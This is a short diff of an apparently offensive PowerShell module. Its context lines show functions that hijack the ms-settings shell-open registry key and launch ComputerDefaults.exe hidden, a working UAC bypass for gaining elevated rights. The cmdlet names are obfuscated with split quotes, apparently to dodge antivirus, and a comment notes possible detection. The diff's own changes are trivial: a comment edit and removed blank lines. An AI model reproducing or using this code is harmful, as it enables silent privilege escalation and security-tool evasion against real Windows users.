@@ -245,7 +245,7 @@ ComputerDefaults -PID '$IDPORT' -File '$Request'
 Export-ModuleMember -Function process-elevate
 Set-Alias -Name process-elevate -Value process-elevate
 
-#warning detected
+#warning posible detected
 function process-elevate2 {
     param(
 		[string]$processName
@@ -257,8 +257,6 @@ se'T-iT'EmP'rop'erty "HKCU:\software\classes\ms-settings\shell\open\command" -Na
 sleep(7.3);
 n'Ew-I'te'mPr'operty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force;(![BOOL]);sleep(9.3);
 Start-Process -WindowStyle hidden "C:\Windows\System32\ComputerDefaults.exe"
-
-
 }
 Export-ModuleMember -Function process-elevate2
 Set-Alias -Name process-elevate2 -Value process-elevate2
